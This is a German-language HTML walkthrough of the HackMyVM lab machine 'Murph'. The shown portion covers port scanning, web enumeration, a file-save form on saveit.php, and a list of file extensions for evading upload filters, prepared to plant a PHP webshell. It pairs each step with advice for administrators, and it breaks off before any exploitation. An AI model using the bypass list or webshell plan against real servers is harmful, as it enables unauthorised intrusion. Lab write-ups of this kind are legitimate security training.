@@ -1,1 +1,1041 @@
-﻿﻿﻿<html><body><h1>Test-Inhalt für Murph - HackMyVM - Medium.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Murph - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Murph - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">fg</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">strings</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">kill</div>
+                <div class="tool-item">echo</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <!-- Hier die Reconnaissance-Schritte einfügen, mit Kommentaren und Code-Blöcken. -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">192.168.2.50</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl dient zur Identifizierung aktiver Hosts im lokalen Netzwerk. Ich nutze <code>arp-scan -l</code>, um das lokale Netzwerksegment zu scannen. Die Ausgabe wird an <code>grep "PCS"</code> gepipet, um Zeilen zu filtern, die 'PCS' enthalten (oft ein Hinweis auf die MAC-Adresse einer VirtualBox-VM). Mit <code>awk '{print $1}'</code> extrahiere ich das erste Feld der gefilterten Zeile, was die IP-Adresse ist. Für Laien: Ich durchsuche mein Netzwerk nach Computern und finde die IP-Adresse eines bestimmten Computers anhand seiner Hardware-Informationen. Für Experten: Standard-Host-Discovery im lokalen Subnetz. Die Filterung hilft bei der schnellen Identifizierung des Ziels.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die IP-Adresse <code>192.168.2.50</code> wurde erfolgreich identifiziert. Dies ist unser Zielsystem und der Ausgangspunkt für alle weiteren Aktivitäten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundene IP-Adresse ist nun unser Fokus für detailliertere Scans.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie, welche Geräte in Ihrem Netzwerksegment aktiv sind und identifizieren Sie unbekannte Hardware. Stellen Sie sicher, dass nur autorisierte Systeme verbunden sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+ <span class="command">192.168.2.50 murph.hmv</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich editiere die Datei <code>/etc/hosts</code> auf meinem Kali-System, um der gefundenen IP-Adresse <code>192.168.2.50</code> einen lokalen Hostnamen <code>murph.hmv</code> zuzuweisen. Dies vereinfacht die Adressierung des Zielsystems in nachfolgenden Befehlen. Für Laien: Ich gebe der IP-Adresse des Zielcomputers einen einfachen Namen auf meinem eigenen Computer, damit ich ihn leichter ansprechen kann. Für Experten: Eine gängige Vorgehensweise, um die Lesbarkeit von Befehlen und Skripten zu verbessern und die manuelle Namensauflösung zu steuern.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das erfolgreiche Hinzufügen des Eintrags ist eine kleine, aber nützliche Vorbereitung. Es hat keine Auswirkungen auf das Zielsystem.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie den Hostnamen <code>murph.hmv</code> in allen weiteren Befehlen.<br><strong>Empfehlung (Admin):</strong> Keine Auswirkungen auf das Zielsystem. Relevant für die Organisation des Pentestenden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.50 | grep open</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    nginx 1.18.0</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe einen umfangreichen Nmap-Scan (<code>-sS -sC -sV -p- -T5 -AO</code>) gegen das Zielsystem durch und filtere die Ausgabe mit <code>grep open</code>, um schnell die offenen Ports zu identifizieren. Für Laien: Ich klopfe an alle 'Türen' des Computers und sehe nach, welche offen sind und welche Programme dahinterstecken. Für Experten: Schnelle Identifizierung der offenen Angriffsfläche. Die Flags bedeuten SYN-Scan, Skripterkennung, Versionserkennung, alle Ports, aggressives Timing, OS-Erkennung.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nur zwei Ports sind offen: Port 22 mit einem SSH-Dienst (OpenSSH 8.4p1) und Port 80 mit einem HTTP-Dienst (nginx 1.18.0). Dies ist eine relativ kleine Angriffsfläche, was bei Systemen mit mittlerem Schwierigkeitsgrad üblich ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wir konzentrieren uns nun auf die Enumeration dieser beiden Dienste.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur absolut notwendige Dienste für externe Verbindungen geöffnet sind. Überprüfen Sie die Konfiguration von SSH und Nginx.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/chisel]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.50</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-16 22:20 CEST</span>
+<span class="command">Nmap scan report for murph.hmv (192.168.2.50)</span>
+<span class="password">Host is up (0.00012s latency).</span>
+Not shown: <span class="command">65533 closed tcp ports (reset)</span>
+<span class="command">PORT   STATE SERVICE VERSION</span>
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
+<span class="command">| ssh-hostkey:</span>
+<span class="command">|   3072 b2:c9:f2:72:7a:ad:71:52:df:9b:31:b1:a9:87:dc:54 (RSA)</span>
+<span class="command">|   256 e9:73:af:55:81:50:2b:13:4c:fe:92:31:c4:b7:ae:4d (ECDSA)</span>
+<span class="command">|_  256 ad:c1:58:71:0e:fc:c8:9e:86:9c:c7:3f:85:be:2d:c8 (ED25519)</span>
+<span class="command">80/tcp open  http    nginx 1.18.0</span>
+<span class="command">|_http-title: Site doesn't have a title (text/html).</span>
+<span class="command">|_http-server-header: nginx/1.18.0</span>
+<span class="command">MAC Address: 08:00:27:27:10:DA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+<span class="command">Device type: general purpose|router</span>
+<span class="command">Running: Linux 4.X|5.X, MikroTik RouterOS 7.X</span>
+<span class="command">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span>
+<span class="command">OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span>
+<span class="command">Network Distance: 1 hop</span>
+<span class="command">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="command">TRACEROUTE</span>
+<span class="command">HOP RTT     ADDRESS</span>
+<span class="command">1   0.12 ms murph.hmv (192.168.2.50)</span>
+
+<span class="password">OS and Service detection performed. Please report any incorrect results at https://nmap.org/cgi-bin/submit.cgi?new-service .</span>
+<span class="password">Nmap done: 1 IP address (1 host up) scanned in 9.24 seconds</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dies ist die vollständige Ausgabe des Nmap-Scans auf dem Zielsystem. Sie enthält die detaillierten Informationen zu den offenen Diensten auf den Ports 22 (SSH) und 80 (Nginx), die genauen Versionsnummern (OpenSSH 8.4p1, nginx 1.18.0), SSH-Hostkeys, HTTP-Header, MAC-Adresse (VirtualBox), geschätztes Betriebssystem (Linux), und Latenzinformationen. Für Laien: Das ist der komplette 'Gesundheits-Check' des Computers, der mir alle Details zu den offenen 'Türen' (Diensten) und dem 'Typ' des Computers (Betriebssystem) liefert. Für Experten: Die genauen Versionsnummern und die OS-Erkennung sind entscheidend für die Recherche nach spezifischen Schwachstellen (CVEs). Die Nginx-Version 1.18.0 ist bekannt. Die MAC-Adresse identifiziert die Umgebung als VirtualBox.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die vollständige Nmap-Ausgabe liefert alle notwendigen Details für die Recherche nach versionsspezifischen Schwachstellen in OpenSSH 8.4p1 und nginx 1.18.0. Dies ist der nächste logische Schritt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Recherchieren Sie bekannte Schwachstellen für OpenSSH 8.4p1 und nginx 1.18.0. Beginnen Sie die detaillierte Enumeration des Nginx-Webservers.<br><strong>Empfehlung (Admin):</strong> Halten Sie die Software auf dem neuesten Stand, um bekannte Schwachstellen zu vermeiden. Minimieren Sie die Informationen, die durch Server-Header und OS-Erkennung preisgegeben werden.</p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <!-- Beginn Web Enumeration -->
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/chisel]
+└─# <span class="command">nikto -h http://murph.hmv</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">- Nikto v2.5.0</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Target IP:          192.168.2.50</span>
+<span class="command">+ Target Hostname:    murph.hmv</span>
+<span class="command">+ Target Port:        80</span>
+<span class="password">+ Start Time:         2025-06-16 22:21:54 (GMT2)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ Server: nginx/1.18.0</span>
+<span class="password">+ /: The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
+<span class="password">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
+<span class="command">+ No CGI Directories found (use '-C all' to force check all possible dirs)</span>
+<span class="password">+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.</span>
+<span class="command">+ 7962 requests: 0 error(s) and 3 item(s) reported on remote host</span>
+<span class="password">+ End Time:           2025-06-16 22:22:03 (GMT2) (9 seconds)</span>
+<span class="password">---------------------------------------------------------------------------</span>
+<span class="command">+ 1 host(s) tested</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich nutze <code>nikto</code>, um den Nginx-Webserver auf Port 80 auf bekannte Schwachstellen und Konfigurationsprobleme zu scannen. Nikto testet automatisch eine Reihe von gängigen Web-Sicherheitschecks. Für Laien: Ich lasse ein Programm die Webseite auf Port 80 nach bekannten 'Problemstellen' durchsuchen. Für Experten: Nikto ist ein schnelles Werkzeug für die automatisierte Web-Enumeration. Es identifiziert oft fehlende Sicherheits-Header und das Vorhandensein potenziell sensibler Dateien.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Nikto-Ausgabe bestätigt den Nginx/1.18.0 Server und weist auf fehlende Sicherheits-Header (<code>X-Frame-Options</code>, <code>X-Content-Type-Options</code>) hin. Interessanterweise findet Nikto die Datei <code>/#wp-config.php#</code> mit dem Hinweis, dass sie Anmeldedaten enthalten könnte. Dies ist oft ein False Positive oder ein Hinweis auf eine Backup-Datei.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die fehlenden Header sind nützliche Hinweise, aber <code>/#wp-config.php#</code> sollte manuell überprüft werden, da es sich um eine Fehlinterpretation oder eine tatsächliche (wenn auch ungewöhnliche) Backup-Datei handeln könnte. Führen Sie weiteres Brute-Forcing von Verzeichnissen und Dateien durch.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie essentielle Sicherheits-Header. Überprüfen Sie, ob temporäre oder Backup-Dateien (wie solche mit `#` am Anfang und Ende) im Webroot liegen und zugänglich sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">gobuster dir -u "http://murph.hmv" -w "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml,yaml,bak -b '503,404,403' -e --no-error -k</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">===============================================================</span>
+<span class="command">Gobuster v3.6</span>
+<span class="command">by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)</span>
+<span class="password">===============================================================</span>
+<span class="command">[+] Url:                     http://murph.hmv</span>
+<span class="command">[+] Method:                  GET</span>
+<span class="command">[+] Threads:                 10</span>
+<span class="command">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+<span class="command">[+] Negative Status codes:   503,404,403</span>
+<span class="command">[+] User Agent:              gobuster/3.6</span>
+<span class="command">[+] Extensions:              raw,pem,conf,config,sql,sh,rpm,mod,ps1,jpg,old,pHtml,tar,phtml,xlsx,java,xls,accdb,pl,crt,cgi,rar,js.map,txt,doc,db,exe,csh,icon,bat,dll,elf,deb,exp,eps,php,zip,mdb,svg,json,pub,aspx,png,html,pdf,kdbx,bak,desc,docx,xml,rtf,diff,ln,asp,gz,jpeg,csv,c,lib,ELF,yaml,py</span>
+<span class="command">[+] Expanded:                true</span>
+<span class="command">[+] Timeout:                 10s</span>
+<span class="password">===============================================================</span>
+<span class="password">Starting gobuster in directory enumeration mode</span>
+<span class="password">===============================================================</span>
+<span class="command">http://murph.hmv/index.html (Status: 200) [Size: 266]</span>
+<span class="command">http://murph.hmv/uploads (Status: 301) [Size: 169] [--> http://murph.hmv/uploads/]</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich nutze <code>gobuster</code>, ein weiteres Tool zum Brute-Forcing von Web-Content, um Verzeichnisse und Dateien auf dem Nginx-Webserver auf Port 80 zu finden. Ich verwende eine mittelgroße Wortliste in Kombination mit einer sehr langen Liste von Dateierweiterungen. Ich ignoriere die Statuscodes 503, 404 und 403. Für Laien: Ich lasse ein Programm viele Namen für Webseiten-Ordner und -Dateien ausprobieren, um versteckte Bereiche zu finden. Für Experten: Gobuster ist ein effektives Werkzeug zur Web-Enumeration. Die Kombination von Wortliste und Extensions erhöht die Chance, versteckte Ressourcen zu finden. Das Ignorieren bestimmter Statuscodes hilft, die Ausgabe zu säubern.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster findet zwei interessante Endpunkte: <code>/index.html</code> (Status 200) und <code>/uploads</code> (Status 301 - Weiterleitung auf <code>/uploads/</code>). Das <code>/uploads</code> Verzeichnis ist potenziell sehr interessant, da es schreibbar sein könnte und das Hochladen von Dateien (z.B. einer Webshell) ermöglichen könnte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde die Seite <code>/index.html</code> untersuchen, um ihre Funktionalität zu verstehen. Das Verzeichnis <code>/uploads</code> ist ein vielversprechendes Ziel für Upload-Schwachstellen und muss manuell geprüft werden.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie Brute-Force-Versuche auf Webserver. Stellen Sie sicher, dass Verzeichnisse, die nicht öffentlich zugänglich sein müssen, nicht indexiert sind (Deaktivieren von autoindex) und keine Weiterleitungen aufdecken.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+ <span class="command">form action="saveit.php" method="get"</span>
+<span class="command">Filename: input type="text" name="filename" <br></span>
+<span class="command">Content: input type="textarea" name="content" <br></span>
+
+<!-- I hate php, so php are replaced by wtf--></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich habe den Quellcode der Hauptseite (<code>http://192.168.2.50/</code> oder <code>/index.html</code>) untersucht. Der Code zeigt ein Formular, das Daten an <code>saveit.php</code> mittels der GET-Methode sendet. Das Formular hat zwei Eingabefelder: 'Filename' (mit dem Namen 'filename') und 'Content' (mit dem Namen 'content'). Ein Kommentar (<code><!-- I hate php, so php are replaced by wtf--></code>) deutet darauf hin, dass die Zeichenkette 'php' möglicherweise durch 'wtf' ersetzt wird. Für Laien: Ich habe mir den 'Bauplan' der Startseite angeschaut und ein Formular gefunden, mit dem man einen Dateinamen und Inhalt eingeben kann. Es scheint, als würde der Computer dann versuchen, eine Datei zu speichern. Ein versteckter Hinweis sagt, dass das Wort 'php' durch 'wtf' ersetzt wird. Für Experten: Das Vorhandensein eines Formulars, das Dateinamen und Inhalte als Parameter entgegennimmt und an ein PHP-Skript sendet, ist ein starker Indikator für eine Datei-Upload- oder Dateischreib-Schwachstelle. Die Verwendung der GET-Methode ist ungewöhnlich für die Übertragung größerer Inhalte, aber für kleine Payloads ausreichend. Der Kommentar deutet auf eine serverseitige Filterung oder Ersetzung hin, die umgangen werden muss.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Formular und das Skript <code>saveit.php</code> sind primäre Ziele. Die Funktionalität scheint das Speichern von benutzerdefiniertem Inhalt unter einem benutzerdefinierten Dateinamen zu ermöglichen. Dies ist ein klassischer Vektor für das Hochladen einer Webshell. Die im Kommentar erwähnte Ersetzung 'php' durch 'wtf' ist eine Herausforderung, die umgangen werden muss.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde versuchen, eine Datei über das Formular oder direkt über eine modifizierte GET-Anfrage an <code>saveit.php</code> hochzuladen. Das Ziel ist, eine PHP-Webshell hochzuladen, wobei ich den 'php' durch 'wtf' Filter umgehen muss (z.B. durch Verwendung von Case-Variationen wie 'PhP' oder URL-Kodierung). Das Verzeichnis <code>/uploads</code>, das Gobuster gefunden hat, ist ein wahrscheinlicher Speicherort für die hochgeladenen Dateien.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie strikte Validierung und Bereinigung von Dateinamen und Inhalten, die über Webformulare übermittelt werden. Verwenden Sie Whitelists für erlaubte Dateitypen und verhindern Sie die Ausführung von Code in Upload-Verzeichnissen. Filterung durch einfache Zeichenkettenersetzung ist unsicher und leicht zu umgehen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">view-source:http://192.168.2.50/saveit.php</span>
+leer</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich habe versucht, den Quellcode des Skripts <code>saveit.php</code> selbst über <code>view-source:</code> im Browser anzusehen. Die Ausgabe ist 'leer', was bedeutet, dass der Server entweder keinen Inhalt zurückgibt, oder der Inhalt so formatiert ist, dass er im Browser nicht angezeigt wird, oder ich keine Berechtigung habe, ihn direkt auszulesen. Für Laien: Ich habe versucht, mir den 'Bauplan' des Programms anzuschauen, das die Dateien speichert, aber es wurde mir nichts angezeigt. Für Experten: Eine leere Antwort beim Versuch, eine PHP-Datei direkt auszulesen, ist typisch, wenn der Server die Datei ausführt, anstatt ihren Quellcode anzuzeigen, oder wenn es einen Fehler gibt. Da ich die Funktionalität des Skripts über das Formular kenne, ist der Quellcode für die Ausnutzung weniger wichtig als das Verständnis der Filterlogik.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Quellcode von <code>saveit.php</code> ist nicht direkt über <code>view-source:</code> zugänglich. Dies ist keine Schwachstelle an sich, aber es bedeutet, dass ich die genaue Logik des Skripts (außer der durch den Kommentar angedeuteten Ersetzung) nicht direkt sehen kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Black-Box-Analyse basierend auf dem Formular und dem Kommentar ist ausreichend, um den Upload-Vektor zu verfolgen. Ich werde versuchen, den Filter experimentell zu umgehen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass der Quellcode sensibler Skripte nicht unbeabsichtigt auslesbar ist. Dies ist hier der Fall, was positiv ist.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl -Iv http://192.168.2.50/saveit.php</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">*   Trying 192.168.2.50:80...</span>
+<span class="password">* Connected to 192.168.2.50 (192.168.2.50) port 80</span>
+<span class="password">* using HTTP/1.x</span>
+<span class="command">> HEAD /saveit.php HTTP/1.1</span>
+<span class="command">> Host: 192.168.2.50</span>
+<span class="command">> User-Agent: curl/8.13.0</span>
+<span class="command">> Accept: */*</span>
+<span class="command">></span>
+<span class="password">* Request completely sent off</span>
+<span class="command">< HTTP/1.1 200 OK</span>
+<span class="command">HTTP/1.1 200 OK</span>
+<span class="command">< Server: nginx/1.18.0</span>
+<span class="command">Server: nginx/1.18.0</span>
+<span class="command">< Date: Mon, 16 Jun 2025 20:26:22 GMT</span>
+<span class="command">Date: Mon, 16 Jun 2025 20:26:22 GMT</span>
+<span class="command">< Content-Type: text/html; charset=UTF-8</span>
+<span class="command">Content-Type: text/html; charset=UTF-8</span>
+<span class="command">< Connection: keep-alive</span>
+<span class="command">Connection: keep-alive</span>
+<span class="command"><</span>
+
+<span class="password">* Connection #0 to host 192.168.2.50 left intact</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich prüfe die HTTP-Header, die vom Skript <code>saveit.php</code> zurückgegeben werden, mittels <code>curl -Iv http://192.168.2.50/saveit.php</code>. Ich sende eine HEAD-Anfrage, um nur die Header zu erhalten, ohne den Inhalt zu laden. Die Ausgabe zeigt einen <code>HTTP/1.1 200 OK</code> Status, was bedeutet, dass das Skript existiert und vom Server verarbeitet wird. Die Header bestätigen den Nginx/1.18.0 Server und den Content-Type <code>text/html; charset=UTF-8</code>. Für Laien: Ich habe das Programm <code>saveit.php</code> auf der Webseite angesprochen und gefragt, was für eine Art 'Dokument' es ist, ohne es komplett herunterzuladen. Es hat geantwortet, dass es eine normale Webseite (HTML) ist und 'ok' ist. Für Experten: Die Header bestätigen die grundlegende Erreichbarkeit und Funktionalität des Skripts. Der <code>Content-Type</code> ist Standard für eine PHP-Datei, die HTML ausgibt oder keinen spezifischen Header setzt. Es gibt keine direkten Hinweise auf Schwachstellen in den Headern selbst.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die grundlegende Erreichbarkeit von <code>saveit.php</code> ist bestätigt. Die Header liefern keine direkten Hinweise auf Schwachstellen, aber die Funktionalität basierend auf dem Formular ist weiterhin ein vielversprechender Upload-Vektor.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf die Umgehung des 'php'-Filters und das Hochladen einer Webshell über die Formular-Parameter.<br><strong>Empfehlung (Admin):</strong> Standardmäßige HTTP-Header-Konfiguration. Stellen Sie sicher, dass keine internen Details offengelegt werden, was hier der Fall ist.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="command">cat bypassfilter.txt</span>
+<span class="command">.php</span>
+<span class="command">.php2</span>
+<span class="command">.php3</span>
+<span class="command">.php4</span>
+<span class="command">.php5</span>
+<span class="command">.php6</span>
+<span class="command">.php7</span>
+<span class="command">.phps</span>
+<span class="command">.phps</span>
+<span class="command">.pht</span>
+<span class="command">.phtm</span>
+<span class="command">.phtml</span>
+<span class="command">.pgif</span>
+<span class="command">.shtml</span>
+<span class="command">.htaccess</span>
+<span class="command">.phar</span>
+<span class="command">.inc</span>
+<span class="command">.asp</span>
+<span class="command">.aspx</span>
+<span class="command">.config</span>
+<span class="command">.ashx</span>
+<span class="command">.asmx</span>
+<span class="command">.aspq</span>
+<span class="command">.axd</span>
+<span class="command">.cshtm</span>
+<span class="command">.cshtml</span>
+<span class="command">.rem</span>
+<span class="command">.soap</span>
+<span class="command">.vbhtm</span>
+<span class="command">.vbhtml</span>
+<span class="command">.asa</span>
+<span class="command">.cer</span>
+<span class="command">.shtml</span>
+<span class="command">.jsp</span>
+<span class="command">.jspx</span>
+<span class="command">.jsw</span>
+<span class="command">.jsv</span>
+<span class="command">.jspf</span>
+<span class="command">.wss</span>
+<span class="command">.do</span>
+<span class="command">.action</span>
+<span class="command">.cfm</span>
+<span class="command">.cfml</span>
+<span class="command">.cfc</span>
+<span class="command">.dbm</span>
+<span class="command">.swf</span>
+<span class="command">.pl</span>
+<span class="command">.cgi</span></p>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dies ist der Inhalt einer lokalen Datei auf meinem Kali-System, die eine Liste gängiger Dateierweiterungen enthält, die oft in Web-Anwendungen für Code-Ausführung oder Konfigurationszwecke verwendet werden. Ich habe diese Liste vorbereitet, um sie beim Versuch, den Upload-Filter zu umgehen, als Wortliste für Dateierweiterungen zu verwenden. Sie enthält verschiedene Varianten von PHP-Erweiterungen (<code>.php</code>, <code>.phtml</code> etc.) sowie Erweiterungen für andere Technologien und Konfigurationsdateien. Für Laien: Das ist eine Liste von Dateitypen, die 'gefährlich' sein können (weil sie oft Programme enthalten). Ich habe diese Liste parat, um sie auszuprobieren, wenn ich versuche, meine eigene 'Programmdatei' hochzuladen. Für Experten: Eine umfangreiche Liste von Dateierweiterungen ist nützlich, um File Upload-Filter zu umgehen, die auf Blacklists basieren oder nur bestimmte Erweiterungen erlauben. Die Aufnahme verschiedener PHP-Varianten (phtml, pht etc.) ist entscheidend, um den 'php' durch 'wtf' Filter zu umgehen, der wahrscheinlich nur die genaue Zeichenfolge 'php' filtert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Liste der Erweiterungen ist ein nützliches Werkzeug, das auf die Umgehung des Filters vorbereitet ist. Die Erweiterung <code>.phtml</code> ist ein vielversprechender Kandidat, um PHP-Code auszuführen, ohne die genaue Zeichenfolge 'php' im Dateinamen verwenden zu müssen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde die Erweiterung <code>.phtml</code> oder eine andere PHP-Variante aus dieser Liste verwenden, wenn ich versuche, eine Webshell hochzuladen, um den 'php' durch 'wtf' Filter zu umgehen.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie Whitelists für erlaubte Dateitypen in Upload-Funktionen, anstatt Blacklists zu verwenden. Stellen Sie sicher, dass Webserver so konfiguriert sind, dass PHP-Code nur in spezifischen, vertrauenswürdigen Verzeichnissen ausgeführt wird, unabhängig von der Dateierweiterung (z.B. durch `SetHandler` oder `php_flag engine off` in nicht-ausführbaren Verzeichnissen).</p>
+        </section>
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <!-- Fortsetzung Web Enumeration -->
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">view-source:http://192.168.2.50/uploads/</span>
+
+<span class="command">403 Forbidden</span>
+<span class="command">nginx/1.18.0</span></pre>
+                </div>
+            </div>
